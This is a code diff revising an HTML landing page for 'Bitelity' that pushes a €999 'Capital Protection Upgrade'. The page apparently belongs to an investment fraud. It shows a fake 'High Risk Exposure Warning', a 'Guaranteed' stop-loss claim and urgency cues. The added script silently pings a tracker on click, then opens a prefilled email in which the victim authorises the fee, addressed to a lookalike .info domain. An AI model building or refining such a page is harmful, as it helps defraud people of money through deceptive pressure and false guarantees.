@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bitelity | Capital Protection Program</title>
+    <title>Bitelity | Institutional Risk Management</title>
     <style>
         :root {
             --primary: #0052FF;
@@ -12,186 +12,193 @@
             --accent: #00C853;
             --text: #FFFFFF;
             --warning: #FFAB00;
+            --danger: #F6465D;
         }
 
         body {
-            margin: 0;
-            padding: 0;
+            margin: 0; padding: 0;
             background-color: var(--dark);
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             color: var(--text);
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            display: flex; justify-content: center; align-items: center;
             min-height: 100vh;
         }
 
         .container {
-            width: 100%;
-            max-width: 500px;
+            width: 90%; max-width: 480px;
             background: var(--secondary);
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border-radius: 16px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+            border: 1px solid #2d333f;
             overflow: hidden;
-            border: 1px solid #333;
         }
 
         .header {
-            padding: 30px;
+            padding: 40px 20px;
             text-align: center;
             background: #161A22;
-            border-bottom: 1px solid #333;
+            border-bottom: 1px solid #2d333f;
         }
 
-        .header img {
-            width: 180px;
-            margin-bottom: 10px;
-        }
+        .header img { width: 180px; }
 
-        .content {
-            padding: 30px;
-        }
+        .content { padding: 35px; }
 
         .status-badge {
-            background: rgba(255, 171, 0, 0.1);
-            color: var(--warning);
-            padding: 8px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
+            background: rgba(246, 69, 93, 0.1);
+            color: var(--danger);
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 800;
             display: inline-block;
             margin-bottom: 20px;
             text-transform: uppercase;
-            letter-spacing: 1px;
         }
 
-        h1 {
-            font-size: 22px;
-            margin: 0 0 15px 0;
-            color: var(--text);
-        }
-
-        p {
-            font-size: 14px;
-            line-height: 1.6;
-            color: #B7BDC6;
-            margin-bottom: 20px;
-        }
+        h1 { font-size: 24px; margin: 0 0 15px 0; }
+        p { font-size: 14px; line-height: 1.6; color: #B7BDC6; margin-bottom: 25px; }
 
         .feature-box {
             background: #161A22;
-            border-radius: 8px;
+            border-radius: 10px;
             padding: 20px;
             margin-bottom: 25px;
+            border: 1px solid #2d333f;
         }
 
         .feature-item {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            font-size: 13px;
+            display: flex; justify-content: space-between;
+            margin-bottom: 12px; font-size: 13px;
         }
 
-        .feature-item span:first-child {
-            color: #848E9C;
-        }
+        .feature-item span:first-child { color: #848E9C; }
+        .feature-item span:last-child { font-weight: 600; color: var(--accent); }
 
-        .feature-item span:last-child {
-            font-weight: bold;
-            color: var(--accent);
-        }
-
-        .price-tag {
-            text-align: center;
-            margin: 20px 0;
-        }
-
-        .price-value {
-            font-size: 32px;
-            font-weight: bold;
-            color: var(--text);
-        }
-
-        .price-label {
-            font-size: 12px;
-            color: #848E9C;
-            display: block;
-        }
+        .price-tag { text-align: center; margin-bottom: 25px; }
+        .price-value { font-size: 36px; font-weight: 700; }
+        .price-label { font-size: 11px; color: #848E9C; display: block; letter-spacing: 1px; }
 
         .btn-upgrade {
             display: block;
             background: var(--primary);
             color: white;
             text-align: center;
-            padding: 16px;
+            padding: 18px;
             text-decoration: none;
-            border-radius: 6px;
-            font-weight: bold;
+            border-radius: 8px;
+            font-weight: 700;
             font-size: 16px;
-            transition: background 0.3s;
+            transition: 0.3s;
+            cursor: pointer;
         }
 
-        .btn-upgrade:hover {
-            background: #0040C7;
+        .btn-upgrade:hover { background: #0040C7; transform: translateY(-2px); }
+
+        /* Success State Styling */
+        #success-message { text-align: center; display: none; padding: 20px 0; }
+        .check-icon {
+            width: 60px; height: 60px;
+            background: var(--accent);
+            color: var(--dark);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 30px; margin: 0 auto 20px;
+            font-weight: bold;
         }
 
-        .footer-note {
-            font-size: 11px;
-            color: #5E6673;
-            text-align: center;
-            margin-top: 20px;
+        .fallback-note {
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #2d333f;
+            font-size: 12px;
+            color: #848E9C;
+            line-height: 1.5;
         }
+
+        .fallback-note a { color: var(--primary); text-decoration: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <img src="https://bitelity.net/Media/Image/logo.svg" alt="Bitelity Logo">
+        <img src="https://bitelity.net/Media/Image/logo.svg" alt="Bitelity">
     </div>
-    
+
     <div class="content">
-        <div class="status-badge">Action Required: Risk Exposure Detected</div>
-        <h1>Capital Protection Upgrade</h1>
-        <p>
-            Due to current market volatility, your account is eligible for the <strong>Institutional Stop-Loss Protocol</strong>. Secure your assets against drawdowns exceeding 10%.
-        </p>
+        <!-- Default State -->
+        <div id="offer-state">
+            <div class="status-badge">High Risk Exposure Warning</div>
+            <h1>Capital Protection Upgrade</h1>
+            <p>Institutional liquidity protocols are now available for your account. Activate the 10% Stop-Loss threshold to secure your principal balance against current market volatility.</p>
 
-        <div class="feature-box">
-            <div class="feature-item">
-                <span>Current Protection:</span>
-                <span style="color: #F6465D;">Standard (20% Risk)</span>
+            <div class="feature-box">
+                <div class="feature-item">
+                    <span>Current Exposure:</span>
+                    <span style="color:var(--danger)">20.00% (Standard)</span>
+                </div>
+                <div class="feature-item">
+                    <span>New Protection:</span>
+                    <span>10.00% (Guaranteed)</span>
+                </div>
+                <div class="feature-item">
+                    <span>Processing:</span>
+                    <span>Instant Activation</span>
+                </div>
             </div>
-            <div class="feature-item">
-                <span>Upgraded Protection:</span>
-                <span>Advanced (10% Risk)</span>
+
+            <div class="price-tag">
+                <span class="price-label">ONE-TIME SERVICE FEE</span>
+                <span class="price-value">€999.00</span>
             </div>
-            <div class="feature-item">
-                <span>Algorithm Priority:</span>
-                <span>Tier-1 High Priority</span>
-            </div>
-            <div class="feature-item">
-                <span>Activation Deadline:</span>
-                <span style="color: var(--warning);">24 June 2024</span>
-            </div>
+
+            <a href="javascript:void(0);" onclick="processUpgrade()" id="cta-btn" class="btn-upgrade">
+                ACTIVATE PROTECTION NOW
+            </a>
         </div>
 
-        <div class="price-tag">
-            <span class="price-label">ONE-TIME ACTIVATION FEE</span>
-            <span class="price-value">€999.00</span>
-        </div>
-
-        <!-- The Mailto Link -->
-        <a href="mailto:kayaer@bitelity.info?subject=Upgrade%20Authorization%20Request%20-%20Capital%20Protection&body=Dear%20Bitelity%20Support%2C%0A%0AI%20have%20reviewed%20the%20Capital%20Protection%20offer%20and%20wish%20to%20proceed%20with%20the%20upgrade%20to%20the%2010%25%20Stop-Loss%20Protocol%20for%20my%20account.%0A%0APlease%20provide%20the%20payment%20instructions%20or%20confirm%20if%20the%20fee%20of%20%E2%82%AC999%20can%20be%20deducted%20from%20my%20current%20balance.%0A%0AAccount%20Holder%3A%20[Name]%0AAccount%20ID%3A%20[ID]" class="btn-upgrade">
-            ACTIVATE PROTECTION NOW
-        </a>
-
-        <div class="footer-note">
-            © 2024 Bitelity Institutional Services. All rights reserved. <br>
-            Protected assets are held in segregated cold-storage during liquidation.
+        <!-- Success State -->
+        <div id="success-message">
+            <div class="check-icon">✓</div>
+            <h2 style="margin-bottom: 10px;">Notification Sent</h2>
+            <p>Your request for the 10% Capital Protection Protocol has been successfully transmitted to our Risk Management Department.</p>
+            
+            <div class="fallback-note">
+                <strong>Important:</strong> If you do not receive an email from your financial advisor in the next 20 minutes, please reach out via <a href="mailto:kayaer@bitelity.info">kayaer@bitelity.info</a>.
+            </div>
         </div>
     </div>
 </div>
+
+<script>
+function processUpgrade() {
+    const btn = document.getElementById('cta-btn');
+    btn.innerHTML = "Securely Processing...";
+    btn.style.opacity = "0.6";
+    btn.style.pointerEvents = "none";
+
+    // 1. Silent ping to tracker
+    fetch('notify.php')
+    .then(() => {
+        // 2. Switch UI states
+        document.getElementById('offer-state').style.display = 'none';
+        document.getElementById('success-message').style.display = 'block';
+
+        // 3. Trigger the email confirmation for the user
+        setTimeout(() => {
+            const subject = encodeURIComponent("Upgrade Authorization Request - Capital Protection");
+            const body = encodeURIComponent("Dear Bitelity Support,\n\nI confirm my request to activate the 10% Capital Protection Protocol for my account. I authorize the one-time activation fee of €999.00.\n\nPlease provide the next steps for settlement.");
+            window.location.href = `mailto:kayaer@bitelity.info?subject=${subject}&body=${body}`;
+        }, 1500);
+    })
+    .catch(err => {
+        // Fallback for offline/error testing
+        document.getElementById('offer-state').style.display = 'none';
+        document.getElementById('success-message').style.display = 'block';
+    });
+}
+</script>
 
 </body>
 </html>
